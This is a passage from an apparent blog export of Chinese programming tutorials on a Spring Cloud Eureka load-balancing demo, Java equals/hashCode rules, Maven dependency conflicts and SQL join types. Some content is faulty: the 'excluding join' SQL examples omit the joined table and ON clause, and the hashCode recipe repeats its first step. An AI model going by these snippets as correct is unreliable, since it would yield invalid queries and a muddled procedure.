 &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Eureka-Invoker"><a href="#Eureka-Invoker" class="headerlink" title="Eureka Invoker"></a>Eureka Invoker</h2><p>同样地，创建first-cloud-invoker maven项目，其pom依赖为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">        &lt;dependencies&gt;</span><br><span class="line">            &lt;dependency&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;Dalston.SR1&lt;/version&gt;</span><br><span class="line">                &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">                &lt;scope&gt;import&lt;/scope&gt;</span><br><span class="line">            &lt;/dependency&gt;</span><br><span class="line">        &lt;/dependencies&gt;</span><br><span class="line">    &lt;/dependencyManagement&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-starter-eureka&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-starter-ribbon&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p>修改其配置文件，使其在启动之后向两个Eureka Server注册：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9000</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">first-cloud-invoker</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://server1:8761/eureka/,http://server2:8762/eureka/</span></span><br></pre></td></tr></table></figure>

<p>同样地，提供一个对外的REST接口，供调用方调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/router"</span>, method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">router</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        RestTemplate template = getRestTemplate();</span><br><span class="line">        String json = template.getForObject(<span class="string">"http://first-cloud-provider/person/1"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstInvoker</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(FirstInvoker<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Rest-Client"><a href="#Rest-Client" class="headerlink" title="Rest Client"></a>Rest Client</h2><p>这边简易实现了一个客户端Rest Client，用来调用Invoker提供的rest接口，以检验provider的负载均衡能力。</p>
<p>它也是一个Maven项目，pom依赖为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>httpclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编写一个测试类，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建默认的HttpClient</span></span><br><span class="line">        CloseableHttpClient httpclient = HttpClients.createDefault();</span><br><span class="line">        <span class="comment">// 调用6次服务并输出结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// 调用 GET 方法请求服务</span></span><br><span class="line">            HttpGet httpget = <span class="keyword">new</span> HttpGet(<span class="string">"http://localhost:9000/router"</span>);</span><br><span class="line">            <span class="comment">// 获取响应</span></span><br><span class="line">            HttpResponse response = httpclient.execute(httpget);</span><br><span class="line">            <span class="comment">// 根据 响应解析出字符串</span></span><br><span class="line">            System.out.println(EntityUtils.toString(response.getEntity()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>按照</p>
<ol>
<li>Eureka Server</li>
<li>Eureka provider</li>
<li>Eureka Invoker</li>
</ol>
<p>的顺序启动。启动完成之后，可以看到Eureka Server1 和 Eureka Server2的注册信息。</p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka8.png" alt="Eureka Server1的注册信息"></p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka9.png" alt="Eureka Server2的注册信息"></p>
<p>最后，执行rest client，可以看到rest client 的输出为：</p>
<p><img src="https://huhansi.github.io/images/2020-04-23-eureka10.png" alt="REST Client的输出"></p>
<p>从输出中可以看出，Invoker在调用的时候，是调用端口12222一次，端口13333一次，然后又是端口12222一次的。说明Eureka 是做了负载均衡的。</p>
<p>接着再看下Invoker的日志：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2020-04-23 17:41:03.095  INFO 16484 --- [nio-9000-exec-1] c.n.l.DynamicServerListLoadBalancer      : DynamicServerListLoadBalancer for client first-cloud-provider initialized: DynamicServerListLoadBalancer:&#123;NFLoadBalancer:name&#x3D;first-cloud-provider,current list of Servers&#x3D;[localhost:13333, localhost:12222],Load balancer stats&#x3D;Zone stats: &#123;defaultzone&#x3D;[Zone:defaultzone;	Instance count:2;	Active connections count: 0;	Circuit breaker tripped count: 0;	Active connections per server: 0.0;]</span><br><span class="line">&#125;,Server stats: [[Server:localhost:12222;	Zone:defaultZone;	Total Requests:0;	Successive connection failure:0;	Total blackout seconds:0;	Last connection made:Thu Jan 01 08:00:00 CST 1970;	First connection made: Thu Jan 01 08:00:00 CST 1970;	Active Connections:0;	total failure count in last (1000) msecs:0;	average resp time:0.0;	90 percentile resp time:0.0;	95 percentile resp time:0.0;	min resp time:0.0;	max resp time:0.0;	stddev resp time:0.0]</span><br><span class="line">, [Server:localhost:13333;	Zone:defaultZone;	Total Requests:0;	Successive connection failure:0;	Total blackout seconds:0;	Last connection made:Thu Jan 01 08:00:00 CST 1970;	First connection made: Thu Jan 01 08:00:00 CST 1970;	Active Connections:0;	total failure count in last (1000) msecs:0;	average resp time:0.0;	90 percentile resp time:0.0;	95 percentile resp time:0.0;	min resp time:0.0;	max resp time:0.0;	stddev resp time:0.0]</span><br><span class="line">]&#125;ServerList:org.springframework.cloud.netflix.ribbon.eureka.DomainExtractingServerList@304a4707</span><br></pre></td></tr></table></figure>

<p>从日志中可以看出，Invoker从Server中获取了服务<code>first-cloud-provider</code>的服务列表，分别是localhost:12222和localhost:13333。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href>疯狂Spring Cloud微服务架构实战</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Eureka</tag>
      </tags>
  </entry>
  <entry>
    <title>equals和hashCode方法</title>
    <url>/2020/04/21/Java/Java%E5%9F%BA%E7%A1%80/2020-04-21-equals%E5%92%8ChashCode%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="equals和hashCode方法"><a href="#equals和hashCode方法" class="headerlink" title="equals和hashCode方法"></a>equals和hashCode方法</h1><p>equals和hashCode都是Object对象中的非final方法，它们设计的目的就是被用来覆盖(override)的，所以在程序设计中还是经常需要处理这两个方法的。而掌握这两个方法的覆盖准则以及它们的区别还是很必要的，相关问题也不少。</p>
<h2 id="不被重写的equals和hashCode方法"><a href="#不被重写的equals和hashCode方法" class="headerlink" title="不被重写的equals和hashCode方法"></a>不被重写的equals和hashCode方法</h2><h3 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h3><p>Object类中自带的equals方法是判断一个对象的引用是否等于另一个对象的引用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span> == obj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="hashCode方法"><a href="#hashCode方法" class="headerlink" title="hashCode方法"></a>hashCode方法</h3><p>它是一个本地方法。它的默认实现是返回内存地址换算而来的一个值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="为什么要重写equals和hashCode方法"><a href="#为什么要重写equals和hashCode方法" class="headerlink" title="为什么要重写equals和hashCode方法"></a>为什么要重写equals和hashCode方法</h2><p>在我们的业务系统中判断对象时有时候需要的不是一种严格意义上的相等，而是一种业务上的对象相等。在这种情况下，原生的equals方法就不能满足我们的需求了。</p>
<p>而重写hashCode方法则是因为有一些关于Object.hashCode的约定（来自《Effective Java》第三版第11条）：</p>
<ol>
<li>在应用程序的执行期间，只要对象的equals方法的比较操作所用到的信息没有修改，那么对同一个对象的多次调用，hashCode方法都必须始终返回同一个值。在一个应用程序与另一个应用程序的执行过程中，执行hashCode方法所返回的值可以不一致</li>
<li>如果两个对象根据equals方法比较是相等的，那么调用这两个对象中的hashCode方法都必须产生同样的整数结果</li>
<li>如果两个对象根据equals方法比较是不相等的，那么调用这两个对象中的hashCode方法，则不一定要求hashCode必须产生不同的结果。但是程序员应该知道，给不相等的对象产生截然不同的整数结果，有可能提高散列表的性能。</li>
</ol>
<p>如果只重写了equals方法而没有重写hashCode方法的话，则会违反约定的第二条：相等的对象必须具有相等的散列码（hashCode）</p>
<h2 id="equals的重写规则"><a href="#equals的重写规则" class="headerlink" title="equals的重写规则"></a>equals的重写规则</h2><ul>
<li>自反性。对于任何非null的引用值x，x.equals(x)应返回true。</li>
<li>对称性。对于任何非null的引用值x与y，当且仅当：y.equals(x)返回true时，x.equals(y)才返回true。</li>
<li>传递性。对于任何非null的引用值x、y与z，如果y.equals(x)返回true，y.equals(z)返回true，那么x.equals(z)也应返回true。</li>
<li>一致性。对于任何非null的引用值x与y，假设对象上equals比较中的信息没有被修改，则多次调用x.equals(y)始终返回true或者始终返回false。</li>
<li>对于任何非空引用值x，x.equal(null)应返回false。</li>
</ul>
<h2 id="重写hashCode的几点提示"><a href="#重写hashCode的几点提示" class="headerlink" title="重写hashCode的几点提示"></a>重写hashCode的几点提示</h2><ol>
<li>把某个非零常数值，比如说17（最好是素数），保存在一个叫result的int类型的变量中。</li>
<li>把某个非零常数值，比如说17（最好是素数），保存在一个叫result的int类型的变量中。<ol>
<li>为该域计算int类型的散列码c：<ol>
<li>如果该域是boolean类型，则计算（f？0:1）。</li>
<li>如果该域是byte、char、short或者int类型，则计算（int）f。</li>
<li>如果该域是float类型，则计算Float.floatToIntBits(f)。</li>
<li>如果该域是long类型，则计算（int）（f ^ (f&gt;&gt;&gt;32)）。</li>
<li>如果该域是double类型，则计算Double.doubleToLongBits(f)得到一个long类型的值，然后按照步骤4，对该long型值计算散列值。</li>
<li>如果该域是一个对象引用，并且该类的equals方法通过递归调用equals的方式来比较这个域，则同样对这个域递归调用hashCode。如果要求一个更为复杂的比较，则为这个域计算一个“规范表示”，然后针对这个范式表示调用hashCode。如果这个域的值为null，则返回0（或者其他某个常数）</li>
<li>如果该域是一个数组，则把每一个元素当做单独的域来处理。也就是说，递归地应用上述规则，对每个重要的元素计算一个散列码，然后根据步骤下面的做法把这些散列值组合起来。</li>
</ol>
</li>
<li>按照下面的公式，把步骤1中计算得到的散列码C组合到result中：<pre><code>result = 31*result+c。</code></pre></li>
</ol>
</li>
<li>返回result。</li>
<li>写完hashCode方法之后，问自己“是否相等的实例具有相等的散列码”。如果不是的话，找出原因，并修改。</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/zknxx/article/details/53862572" target="_blank" rel="noopener">java为什么要重写hashCode和equals方法</a></p>
<p><a href="https://blog.csdn.net/javazejian/article/details/51348320" target="_blank" rel="noopener">重写equal()时为什么也得重写hashCode()之深度解读equal方法与hashCode方法渊源</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>equals</tag>
        <tag>hashCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Maven如何解决包冲突</title>
    <url>/2020/04/20/Maven/2020-04-20-Maven%E4%B8%AD%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%8C%85%E5%86%B2%E7%AA%81/</url>
    <content><![CDATA[<h1 id="Maven如何解决包冲突"><a href="#Maven如何解决包冲突" class="headerlink" title="Maven如何解决包冲突"></a>Maven如何解决包冲突</h1><p>Maven是一个跨平台的项目管理工具。作为Apache组织的一个颇为成功的开源项目，其主要服务于基于Java平台的项目创建，依赖管理和项目信息管理。</p>
<h2 id="Maven依赖配置"><a href="#Maven依赖配置" class="headerlink" title="Maven依赖配置"></a>Maven依赖配置</h2><p>maven的依赖配置主要是如下格式：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;project&gt; </span><br><span class="line"> ...</span><br><span class="line">  &lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">      &lt;groupId&gt;...&lt;/groupId&gt;  </span><br><span class="line">      &lt;artifactId&gt;...&lt;/artifactId&gt;  </span><br><span class="line">      &lt;version&gt;...&lt;/version&gt;</span><br><span class="line">      &lt;type&gt;...&lt;/type&gt;</span><br><span class="line">      &lt;scope&gt;...&lt;/scope&gt;</span><br><span class="line">      &lt;optional&gt;...&lt;/optional&gt;</span><br><span class="line">      &lt;exclusions&gt;  </span><br><span class="line">        &lt;exclusion&gt;  </span><br><span class="line">          &lt;groupId&gt;...&lt;/groupId&gt;  </span><br><span class="line">          &lt;artifactId&gt;...&lt;/artifactId&gt;  </span><br><span class="line">        &lt;/exclusion&gt;</span><br><span class="line">         ...</span><br><span class="line">      &lt;/exclusions&gt;  </span><br><span class="line">    &lt;/dependency&gt; </span><br><span class="line">     ...</span><br><span class="line">  &lt;/dependencies&gt; </span><br><span class="line">  ... </span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>根元素下project下的dependencies可以包含一个或者多个dependency元素，以声明一个或者多个项目依赖。每个依赖可以包含的元素有：</p>
<ul>
<li>groupId,artifactId和version：依赖的基本坐标，对于任何一个依赖来说，基本坐标是最重要的，Maven根据坐标才能找到需要的依赖。</li>
<li>type：依赖的类型，对应于项目坐标定义的packaging。大部分情况下，该元素不必声明，其默认值是jar。</li>
<li>scope：依赖的范围，下面会进行详解。</li>
<li>optional：标记依赖是否可选。</li>
<li>exclusions：用来排除传递性依赖</li>
</ul>
<h2 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h2><p>Maven在编译主代码的时候需要使用一套classpath,在编译和执行测试的时候会使用另一套classpath,实际运行项目的时候，又会使用一套classpath。</p>
<p>依赖范围就是用来控制依赖与这三种classpath（编译classpath、测试classpath、运行classpath）的关系，Maven有以下几种依赖范围：</p>
<ul>
<li><strong>compile</strong>：编译依赖范围。如果没有指定，就会默认使用该依赖范围。使用此依赖范围的Maven依赖，对于编译、测试、运行三种classpath都有效。典型的例子是spring-core，在编译，测试和运行的时候都需要使用该依赖。</li>
<li><strong>provided</strong>：已提供依赖范围。使用此依赖范围的Maven依赖，对于编译和测试classpath有效，但在运行时无效。典型的例子是servlet-api，编译和测试项目的时候需要该依赖，但在运行项目的时候，由于容器已经提供，就不需要Maven重复地引入一遍。</li>
<li><strong>test</strong>：测试依赖范围。使用此依赖范围的Maven依赖，只对于测试classpath有效，在编译主代码或者运行项目的使用时将无法使用此类依赖。典型的例子就是JUnit，它只有在编译测试代码及运行测试的时候才需要。</li>
<li><strong>runtime</strong>：运行时依赖范围。使用此依赖范围的Maven依赖，对于测试和运行classpath有效，但在编译主代码时无效。典型的例子是JDBC驱动实现，项目主代码的编译只需要JDK提供的JDBC接口，只有在执行测试或者运行项目的时候才需要实现上述接口的具体JDBC驱动。</li>
<li><strong>system</strong>：系统依赖范围。该依赖范围与provided所表示的依赖范围一致，对于编译和测试classpath有效，但在运行时无效。只是使用system范围依赖时必须通过systemPath元素显式地指定依赖文件的路径。由于此类依赖不是通过Maven仓库解析的，而且往往与本机系统绑定，可能造成构建的不可移植，因此应该谨慎使用，systemPath元素可以引用环境变量。</li>
</ul>
<h2 id="依赖传递"><a href="#依赖传递" class="headerlink" title="依赖传递"></a>依赖传递</h2><p>当我们项目依赖了Jar包A，而Jar包A又依赖了Jar包B和Jar包C，那么maven在引入的时候就会把A依赖的包B和C也一并引入进来。</p>
<h2 id="包冲突产生的原因"><a href="#包冲突产生的原因" class="headerlink" title="包冲突产生的原因"></a>包冲突产生的原因</h2><p>假设项目A引用了Jar包B和Jar包C，Jar包B又引用了Jar包D的1.0版本，而Jar包C引用了Jar包D的2.0版本。这个时候，因为依赖传递，Maven会引入Jar包D的1.0和2.0版本，这个时候就产生了包冲突。</p>
<h2 id="Maven解决包冲突的措施"><a href="#Maven解决包冲突的措施" class="headerlink" title="Maven解决包冲突的措施"></a>Maven解决包冲突的措施</h2><p>在某些场景下，Maven是可以自动处理包冲突问题的，它遵循以下两个原则：</p>
<ul>
<li>最短路径有限</li>
</ul>
<p>​        如果有两个引用关系链A-&gt;B-&gt;C和A-&gt;D-&gt;E-&gt;C，那么Maven会自动选择短的这个引用链上的C的版本包</p>
<ul>
<li><p>最先声明优先</p>
<p>  如果两个引用关系链的长度是一样的。比如A-&gt;B -&gt;C和A-&gt;D-&gt;C，那么Maven会自动选取先声明的B或者D对应的C的版本包</p>
</li>
<li><p>手动排除</p>
<p>  如果Maven的自动策略无法处理冲突问题的话，那么可以通过手动排除的方法，在Pom文件中使用&lt;exclusion&gt;标签排除冲突的Jar包</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.4.4.RELEASE&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;exclusions&gt;</span><br><span class="line">            &lt;exclusion&gt;</span><br><span class="line">                &lt;groupId&gt;com.google.guava&lt;&#x2F;groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;guava&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;&#x2F;exclusion&gt;</span><br><span class="line">    &lt;&#x2F;exclusions&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>版本锁定</p>
<p>  把公共依赖提取出来，放到父版本的pom文件中，子项目一律使用继承的方式引用父项目的pom文件。</p>
</li>
</ul>
<h2 id="查看包冲突的有关工具"><a href="#查看包冲突的有关工具" class="headerlink" title="查看包冲突的有关工具"></a>查看包冲突的有关工具</h2><ul>
<li>Maven Helper</li>
<li>mvn dependency:tree</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/honghailiang888/article/details/53019635" target="_blank" rel="noopener">Maven的传递性依赖及其jar包冲突解决</a></p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Maven</tag>
        <tag>包冲突</tag>
        <tag>依赖传递</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL中的各种join</title>
    <url>/2020/04/20/MySQL/2020-04-20-SQL%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8Djoin/</url>
    <content><![CDATA[<h1 id="SQL中的各种join"><a href="#SQL中的各种join" class="headerlink" title="SQL中的各种join"></a>SQL中的各种join</h1><p>在实际的数据库应用中，我们经常需要从多个数据表中读取数据，这时我们就可以使用SQL语句中的连接（JOIN），在两个或多个数据表中查询数据。</p>
<h2 id="inner-join"><a href="#inner-join" class="headerlink" title="inner join"></a>inner join</h2><p>inner join 被称为内连接，在使用的时候可以把inner 关键字省略，直接使用join。</p>
<p>它返回的是两张表中的共同的数据，舍弃不一致的数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">from</span> A <span class="keyword">join</span> B <span class="keyword">on</span> A.key = B.key <span class="keyword">where</span> ...</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-20-join1.png" alt="inner join"></p>
<h2 id="left-join"><a href="#left-join" class="headerlink" title="left join"></a>left join</h2><p>left join 被称为左连接，也可以写为left outter join。它会返回左表（表A）中的所有记录，以及右表中的关联数据。如果左表中的某些记录在右边中不存在值的话，就填充null。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">FROM</span> A <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> B <span class="keyword">ON</span> A.Key = B.Key <span class="keyword">where</span> ...</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-20-join2.png" alt="left join"></p>
<h2 id="right-join"><a href="#right-join" class="headerlink" title="right join"></a>right join</h2><p>right join被称为右连接，也可以写为right outter join，它会返回右表（表B）中的所有记录，以及左表中的关联数据。如果右表中的某些记录在左边不存在值的话，就填充null。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">FROM</span> A <span class="keyword">right</span> <span class="keyword">JOIN</span> B <span class="keyword">ON</span> A.Key = B.Key <span class="keyword">where</span> ...</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-20-join3.png" alt="right join"></p>
<h2 id="full-outer-join"><a href="#full-outer-join" class="headerlink" title="full outer join"></a>full outer join</h2><p>FULL OUTER JOIN 一般被译作外连接、全连接，实际查询语句中可以写作 <code>FULL OUTER JOIN</code> 或 <code>FULL JOIN</code>。外连接查询能返回左右表里的所有记录，其中左右表里能关联起来的记录被连接后返回。</p>
<p>如果两表之间互相没有的数据会填充null。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [select_list] <span class="keyword">FROM</span> A <span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> B <span class="keyword">ON</span> A.Key = B.Key <span class="keyword">where</span> ...</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-20-join4.png" alt="full join"></p>
<h2 id="cross-join"><a href="#cross-join" class="headerlink" title="cross join"></a>cross join</h2><p>返回左表和右表之间符合条件的记录的笛卡尔积</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">select</span> <span class="keyword">list</span>] <span class="keyword">FROM</span> A <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> B;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-20-join5.png" alt="cross join"></p>
<h2 id="self-join"><a href="#self-join" class="headerlink" title="self join"></a>self join</h2><p>返回表与自己连接后符合条件的记录，一般用在表里有一个字段是用主键作为外键的情况。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT [select list] FROM table A, table B WHERE A.key &#x3D; B.key;</span><br></pre></td></tr></table></figure>

<h2 id="left-excluding-join"><a href="#left-excluding-join" class="headerlink" title="left excluding join"></a>left excluding join</h2><p>返回左表（表A）有的数据，并且右表（表B）没有数据的数据集合。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT [select list] FROM A left join WHERE B.key is null;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-20-join6.png" alt="left excluding join"></p>
<h2 id="right-excluding-join"><a href="#right-excluding-join" class="headerlink" title="right excluding join"></a>right excluding join</h2><p>返回右表（表B）有的数据，并且右左表（表A）没有数据的数据集合。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT [select list] FROM A right join WHERE A.key is null;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-20-join7.png" alt="left excluding join"></p>
<h2 id="outer-excluding-join"><a href="#outer-excluding-join" class="headerlink" title="outer excluding join"></a>outer excluding join</h2><p>返回左表（表A）和右表（表B）中没有互相关联的数据集。</p>
